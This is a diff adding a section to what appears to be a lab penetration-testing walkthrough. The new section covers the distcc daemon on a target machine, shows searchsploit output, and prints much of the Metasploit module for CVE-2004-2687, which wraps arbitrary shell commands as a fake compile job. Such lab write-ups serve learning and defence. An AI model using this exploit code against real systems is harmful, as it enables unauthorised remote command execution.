@@ -310,8 +310,130 @@ end
 
 #### distcc
 
-Another attack vector we have 
+Another attack vector we have found on the target is distcc which is a program that allows distributed compilation of code across multiple computers. It is often used to speed up the compilation process by distributing the workload among multiple machines in a network. To check if it has any vulnerability, again we run searchsploit. 
 
 ```bash
-
+searchsploit distcc
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+DistCC Daemon - Command Execution (Metasploit)                                                                                                            | multiple/remote/9915.rb
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
 ```
+
+Well, it gets one hit in searchsploit so let's zoom in and see what we can find more about it.
+
+```bash
+searchsploit -x 9915
+##
+# $Id: distcc_exec.rb 9669 2010-07-03 03:13:45Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+        Rank = ExcellentRanking
+
+        include Msf::Exploit::Remote::Tcp
+
+        def initialize(info = {})
+                super(update_info(info,
+                        'Name'           => 'DistCC Daemon Command Execution',
+                        'Description'    => %q{
+                                This module uses a documented security weakness to execute
+                                arbitrary commands on any system running distccd.
+
+                        },
+                        'Author'         => [ 'hdm' ],
+                        'License'        => MSF_LICENSE,
+                        'Version'        => '$Revision: 9669 $',
+                        'References'     =>
+                                [
+                                        [ 'CVE', '2004-2687'],
+                                        [ 'OSVDB', '13378' ],
+                                        [ 'URL', 'http://distcc.samba.org/security.html'],
+
+                                ],
+                        'Platform'       => ['unix'],
+                        'Arch'           => ARCH_CMD,
+                        'Privileged'     => false,
+# some more Ruby code HERE
+        def exploit # <----- EXPLOIT
+                connect
+
+                distcmd = dist_cmd("sh", "-c", payload.encoded);
+                sock.put(distcmd)
+
+                dtag = rand_text_alphanumeric(10)
+                sock.put("DOTI0000000A#{dtag}\n")
+
+                res = sock.get_once(24, 5)
+
+                if !(res and res.length == 24)
+                        print_status("The remote distccd did not reply to our request")
+                        disconnect
+                        return
+                end
+
+                # Check STDERR
+                res = sock.get_once(4, 5)
+                res = sock.get_once(8, 5)
+                len = [res].pack("H*").unpack("N")[0]
+
+                return if not len
+                if (len > 0)
+                        res = sock.get_once(len, 5)
+                        res.split("\n").each do |line|
+                                print_status("stderr: #{line}")
+                        end
+                end
+
+                # Check STDOUT
+                res = sock.get_once(4, 5)
+                res = sock.get_once(8, 5)
+                len = [res].pack("H*").unpack("N")[0]
+
+                return if not len
+                if (len > 0)
+                        res = sock.get_once(len, 5)
+                        res.split("\n").each do |line|
+                        end
+                end
+
+                handler
+                disconnect
+        end
+
+        # Generate a distccd command
+        def dist_cmd(*args)
+
+                # Convince distccd that this is a compile
+                args.concat(%w{# -c main.c -o main.o})
+
+                # Set distcc 'magic fairy dust' and argument count
+                res = "DIST00000001" + sprintf("ARGC%.8x", args.length)
+
+                # Set the command arguments
+                args.each do |arg|
+                        res << sprintf("ARGV%.8x%s", arg.length, arg)
+                end
+
+                return res
+        end
+
+end
+```
+
+At this point, I have collected enough information about the target in recon stage. Next step is to actually exploit those weaknesses. 
+
